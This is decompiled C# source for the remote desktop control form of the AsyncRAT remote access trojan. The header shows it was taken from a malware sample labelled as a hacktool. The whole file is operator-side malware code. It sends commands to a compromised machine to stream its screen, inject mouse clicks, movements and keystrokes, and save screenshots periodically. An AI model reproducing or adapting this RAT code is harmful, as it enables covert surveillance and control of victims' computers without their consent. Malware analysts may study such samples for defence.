// Decompiled with JetBrains decompiler
// Type: Server.Forms.FormRemoteDesktop
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Server.Forms
{
  public class FormRemoteDesktop : Form
  {
    public int FPS;
    public Stopwatch sw = Stopwatch.StartNew();
    public IUnsafeCodec decoder = (IUnsafeCodec) new UnsafeStreamCodec(60);
    public Size rdSize;
    private bool isMouse;
    private bool isKeyboard;
    public object syncPicbox = new object();
    private readonly List<Keys> _keysPressed;
    private IContainer components;
    public PictureBox pictureBox1;
    public System.Windows.Forms.Timer timer1;
    private Panel panel1;
    private Label label1;
    private Button button1;
    private Button button2;
    public NumericUpDown numericUpDown1;
    private Label label2;
    public NumericUpDown numericUpDown2;
    private Button btnSave;
    private System.Windows.Forms.Timer timerSave;
    private Button btnMouse;
    public Label labelWait;
    private Button btnKeyboard;

    public Form1 F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string FullPath { get; set; }

    public Image GetImage { get; set; }

    public FormRemoteDesktop()
    {
      this._keysPressed = new List<Keys>();
      this.InitializeComponent();
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        if (this.ParentClient.TcpClient.Connected && this.Client.TcpClient.Connected)
          return;
        this.Close();
      }
      catch
      {
        this.Close();
      }
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      if (!this.panel1.Visible)
      {
        this.panel1.Visible = true;
        this.button2.Top = this.panel1.Bottom + 5;
        this.button2.BackgroundImage = (Image) Resources.arrow_up;
      }
      else
      {
        this.panel1.Visible = false;
        this.button2.Top = this.pictureBox1.Top + 5;
        this.button2.BackgroundImage = (Image) Resources.arrow_down;
      }
    }

    private void FormRemoteDesktop_Load(object sender, EventArgs e)
    {
      try
      {
        this.button2.Top = this.panel1.Bottom + 5;
        this.button2.Left = this.pictureBox1.Width / 2;
        this.button1.Tag = (object) "stop";
        this.button2.PerformClick();
      }
      catch
      {
      }
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (this.button1.Tag == (object) "play")
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
        msgPack.ForcePathObject("Option").AsString = "capture";
        msgPack.ForcePathObject("Quality").AsInteger = (long) Convert.ToInt32(this.numericUpDown1.Value.ToString());
        msgPack.ForcePathObject("Screen").AsInteger = (long) Convert.ToInt32(this.numericUpDown2.Value.ToString());
        this.decoder = (IUnsafeCodec) new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value));
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        this.numericUpDown1.Enabled = false;
        this.numericUpDown2.Enabled = false;
        this.btnSave.Enabled = true;
        this.btnMouse.Enabled = true;
        this.button1.Tag = (object) "stop";
        this.button1.BackgroundImage = (Image) Resources.stop__1_;
      }
      else
      {
        this.button1.Tag = (object) "play";
        try
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
          msgPack.ForcePathObject("Option").AsString = "stop";
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
        catch
        {
        }
        this.numericUpDown1.Enabled = true;
        this.numericUpDown2.Enabled = true;
        this.btnSave.Enabled = false;
        this.btnMouse.Enabled = false;
        this.button1.BackgroundImage = (Image) Resources.play_button;
      }
    }

    private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e) => this.button2.Left = this.pictureBox1.Width / 2;

    private void BtnSave_Click(object sender, EventArgs e)
    {
      if (this.button1.Tag != (object) "stop")
        return;
      if (this.timerSave.Enabled)
      {
        this.timerSave.Stop();
        this.btnSave.BackgroundImage = (Image) Resources.save_image;
      }
      else
      {
        this.timerSave.Start();
        this.btnSave.BackgroundImage = (Image) Resources.save_image2;
        try
        {
          if (!Directory.Exists(this.FullPath))
            Directory.CreateDirectory(this.FullPath);
          Process.Start(this.FullPath);
        }
        catch
        {
        }
      }
    }

    private void TimerSave_Tick(object sender, EventArgs e)
    {
      try
      {
        if (!Directory.Exists(this.FullPath))
          Directory.CreateDirectory(this.FullPath);
        Encoder quality = Encoder.Quality;
        EncoderParameters encoderParams = new EncoderParameters(1);
        EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
        encoderParams.Param[0] = encoderParameter;
        ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
        this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParams);
        encoderParams?.Dispose();
        encoderParameter?.Dispose();
      }
      catch
      {
      }
    }

    private ImageCodecInfo GetEncoder(ImageFormat format)
    {
      foreach (ImageCodecInfo imageDecoder in ImageCodecInfo.GetImageDecoders())
      {
        if (imageDecoder.FormatID == format.Guid)
          return imageDecoder;
      }
      return (ImageCodecInfo) null;
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
      try
      {
        if (this.button1.Tag != (object) "stop" || this.pictureBox1.Image == null || !this.pictureBox1.ContainsFocus || !this.isMouse)
          return;
        Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
        int num = 0;
        if (e.Button == MouseButtons.Left)
          num = 2;
        if (e.Button == MouseButtons.Right)
          num = 8;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
        msgPack.ForcePathObject("Option").AsString = "mouseClick";
        msgPack.ForcePathObject("X").AsInteger = (long) point.X;
        msgPack.ForcePathObject("Y").AsInteger = (long) point.Y;
        msgPack.ForcePathObject("Button").AsInteger = (long) num;
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
    {
      try
      {
        if (this.button1.Tag != (object) "stop" || this.pictureBox1.Image == null || !this.pictureBox1.ContainsFocus || !this.isMouse)
          return;
        Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
        int num = 0;
        if (e.Button == MouseButtons.Left)
          num = 4;
        if (e.Button == MouseButtons.Right)
          num = 16;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
        msgPack.ForcePathObject("Option").AsString = "mouseClick";
        msgPack.ForcePathObject("X").AsInteger = (long) point.X;
        msgPack.ForcePathObject("Y").AsInteger = (long) point.Y;
        msgPack.ForcePathObject("Button").AsInteger = (long) num;
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
    {
      try
      {
        if (this.pictureBox1.Image == null || !this.ContainsFocus || !this.isMouse)
          return;
        Point point = new Point(e.X * (this.rdSize.Width / this.pictureBox1.Width), e.Y * (this.rdSize.Height / this.pictureBox1.Height));
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
        msgPack.ForcePathObject("Option").AsString = "mouseMove";
        msgPack.ForcePathObject("X").AsInteger = (long) point.X;
        msgPack.ForcePathObject("Y").AsInteger = (long) point.Y;
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      if (this.isMouse)
      {
        this.isMouse = false;
        this.btnMouse.BackgroundImage = (Image) Resources.mouse;
      }
      else
      {
        this.isMouse = true;
        this.btnMouse.BackgroundImage = (Image) Resources.mouse_enable;
      }
      this.pictureBox1.Focus();
    }

    private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
    {
      try
      {
        this.GetImage?.Dispose();
        ThreadPool.QueueUserWorkItem((WaitCallback) (o => this.Client?.Disconnected()));
      }
      catch
      {
      }
    }

    private void btnKeyboard_Click(object sender, EventArgs e)
    {
      if (this.isKeyboard)
      {
        this.isKeyboard = false;
        this.btnKeyboard.BackgroundImage = (Image) Resources.keyboard;
      }
      else
      {
        this.isKeyboard = true;
        this.btnKeyboard.BackgroundImage = (Image) Resources.keyboard_on;
      }
      this.pictureBox1.Focus();
    }

    private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
    {
      if (this.button1.Tag != (object) "stop" || this.pictureBox1.Image == null || !this.pictureBox1.ContainsFocus || !this.isKeyboard)
        return;
      if (!this.IsLockKey(e.KeyCode))
        e.Handled = true;
      if (this._keysPressed.Contains(e.KeyCode))
        return;
      this._keysPressed.Add(e.KeyCode);
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
      msgPack.ForcePathObject("Option").AsString = "keyboardClick";
      msgPack.ForcePathObject("key").AsInteger = (long) Convert.ToInt32((object) e.KeyCode);
      msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
      ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
    }

    private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
    {
      if (this.button1.Tag != (object) "stop" || this.pictureBox1.Image == null || !this.ContainsFocus || !this.isKeyboard)
        return;
      if (!this.IsLockKey(e.KeyCode))
        e.Handled = true;
      this._keysPressed.Remove(e.KeyCode);
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
      msgPack.ForcePathObject("Option").AsString = "keyboardClick";
      msgPack.ForcePathObject("key").AsInteger = (long) Convert.ToInt32((object) e.KeyCode);
      msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
      ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
    }

    private bool IsLockKey(Keys key) => (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormRemoteDesktop));
      this.pictureBox1 = new PictureBox();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.panel1 = new Panel();
      this.btnKeyboard = new Button();
      this.btnMouse = new Button();
      this.btnSave = new Button();
      this.label2 = new Label();
      this.numericUpDown2 = new NumericUpDown();
      this.label1 = new Label();
      this.numericUpDown1 = new NumericUpDown();
      this.button1 = new Button();
      this.button2 = new Button();
      this.timerSave = new System.Windows.Forms.Timer(this.components);
      this.labelWait = new Label();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.panel1.SuspendLayout();
      this.numericUpDown2.BeginInit();
      this.numericUpDown1.BeginInit();
      this.SuspendLayout();
      this.pictureBox1.Dock = DockStyle.Fill;
      this.pictureBox1.Location = new Point(0, 0);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(938, 485);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.pictureBox1.MouseDown += new MouseEventHandler(this.PictureBox1_MouseDown);
      this.pictureBox1.MouseMove += new MouseEventHandler(this.pictureBox1_MouseMove);
      this.pictureBox1.MouseUp += new MouseEventHandler(this.PictureBox1_MouseUp);
      this.timer1.Interval = 2000;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.panel1.BackColor = Color.Transparent;
      this.panel1.Controls.Add((Control) this.btnKeyboard);
      this.panel1.Controls.Add((Control) this.btnMouse);
      this.panel1.Controls.Add((Control) this.btnSave);
      this.panel1.Controls.Add((Control) this.label2);
      this.panel1.Controls.Add((Control) this.numericUpDown2);
      this.panel1.Controls.Add((Control) this.label1);
      this.panel1.Controls.Add((Control) this.numericUpDown1);
      this.panel1.Controls.Add((Control) this.button1);
      this.panel1.Dock = DockStyle.Top;
      this.panel1.Location = new Point(0, 0);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(938, 38);
      this.panel1.TabIndex = 1;
      this.btnKeyboard.BackgroundImage = (Image) Resources.keyboard;
      this.btnKeyboard.BackgroundImageLayout = ImageLayout.Stretch;
      this.btnKeyboard.Location = new Point(622, 3);
      this.btnKeyboard.Name = "btnKeyboard";
      this.btnKeyboard.Size = new Size(32, 32);
      this.btnKeyboard.TabIndex = 6;
      this.btnKeyboard.UseVisualStyleBackColor = true;
      this.btnKeyboard.Click += new EventHandler(this.btnKeyboard_Click);
      this.btnMouse.BackgroundImage = (Image) Resources.mouse;
      this.btnMouse.BackgroundImageLayout = ImageLayout.Stretch;
      this.btnMouse.Location = new Point(550, 3);
      this.btnMouse.Name = "btnMouse";
      this.btnMouse.Size = new Size(32, 32);
      this.btnMouse.TabIndex = 3;
      this.btnMouse.UseVisualStyleBackColor = true;
      this.btnMouse.Click += new EventHandler(this.Button3_Click);
      this.btnSave.BackgroundImage = (Image) Resources.save_image;
      this.btnSave.BackgroundImageLayout = ImageLayout.Stretch;
      this.btnSave.Location = new Point(455, 3);
      this.btnSave.Name = "btnSave";
      this.btnSave.Size = new Size(32, 32);
      this.btnSave.TabIndex = 5;
      this.btnSave.UseVisualStyleBackColor = true;
      this.btnSave.Click += new EventHandler(this.BtnSave_Click);
      this.label2.AutoSize = true;
      this.label2.Location = new Point(268, 9);
      this.label2.Name = "label2";
      this.label2.Size = new Size(76, 20);
      this.label2.TabIndex = 4;
      this.label2.Text = "SCREEN";
      this.numericUpDown2.BorderStyle = BorderStyle.FixedSingle;
      this.numericUpDown2.Enabled = false;
      this.numericUpDown2.Increment = new Decimal(new int[4]
      {
        10,
        0,
        0,
        0
      });
      this.numericUpDown2.Location = new Point(352, 5);
      this.numericUpDown2.Maximum = new Decimal(new int[4]);
      this.numericUpDown2.Name = "numericUpDown2";
      this.numericUpDown2.Size = new Size(63, 26);
      this.numericUpDown2.TabIndex = 3;
      this.numericUpDown2.TextAlign = HorizontalAlignment.Center;
      this.numericUpDown2.UpDownAlign = LeftRightAlignment.Left;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(82, 9);
      this.label1.Name = "label1";
      this.label1.Size = new Size(78, 20);
      this.label1.TabIndex = 2;
      this.label1.Text = "QUALITY";
      this.numericUpDown1.BorderStyle = BorderStyle.FixedSingle;
      this.numericUpDown1.Enabled = false;
      this.numericUpDown1.Increment = new Decimal(new int[4]
      {
        10,
        0,
        0,
        0
      });
      this.numericUpDown1.Location = new Point(166, 5);
      this.numericUpDown1.Minimum = new Decimal(new int[4]
      {
        20,
        0,
        0,
        0
      });
      this.numericUpDown1.Name = "numericUpDown1";
      this.numericUpDown1.Size = new Size(82, 26);
      this.numericUpDown1.TabIndex = 1;
      this.numericUpDown1.TextAlign = HorizontalAlignment.Center;
      this.numericUpDown1.UpDownAlign = LeftRightAlignment.Left;
      this.numericUpDown1.Value = new Decimal(new int[4]
      {
        30,
        0,
        0,
        0
      });
      this.button1.BackgroundImage = (Image) Resources.stop__1_;
      this.button1.BackgroundImageLayout = ImageLayout.Stretch;
      this.button1.Location = new Point(12, 3);
      this.button1.Name = "button1";
      this.button1.Size = new Size(32, 32);
      this.button1.TabIndex = 0;
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.Button1_Click);
      this.button2.BackgroundImage = (Image) Resources.arrow_up;
      this.button2.BackgroundImageLayout = ImageLayout.Stretch;
      this.button2.FlatStyle = FlatStyle.Flat;
      this.button2.Location = new Point(428, 44);
      this.button2.Name = "button2";
      this.button2.Size = new Size(18, 18);
      this.button2.TabIndex = 2;
      this.button2.Text = " ";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.Button2_Click);
      this.timerSave.Interval = 1500;
      this.timerSave.Tick += new EventHandler(this.TimerSave_Tick);
      this.labelWait.AutoSize = true;
      this.labelWait.Font = new Font("Microsoft Sans Serif", 12f);
      this.labelWait.Location = new Point(376, 222);
      this.labelWait.Name = "labelWait";
      this.labelWait.Size = new Size(78, 29);
      this.labelWait.TabIndex = 3;
      this.labelWait.Text = "Wait...";
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(938, 485);
      this.Controls.Add((Control) this.labelWait);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.panel1);
      this.Controls.Add((Control) this.pictureBox1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.KeyPreview = true;
      this.MinimumSize = new Size(655, 440);
      this.Name = nameof (FormRemoteDesktop);
      this.Text = "RemoteDesktop";
      this.FormClosed += new FormClosedEventHandler(this.FormRemoteDesktop_FormClosed);
      this.Load += new EventHandler(this.FormRemoteDesktop_Load);
      this.ResizeEnd += new EventHandler(this.FormRemoteDesktop_ResizeEnd);
      this.KeyDown += new KeyEventHandler(this.FormRemoteDesktop_KeyDown);
      this.KeyUp += new KeyEventHandler(this.FormRemoteDesktop_KeyUp);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.numericUpDown2.EndInit();
      this.numericUpDown1.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
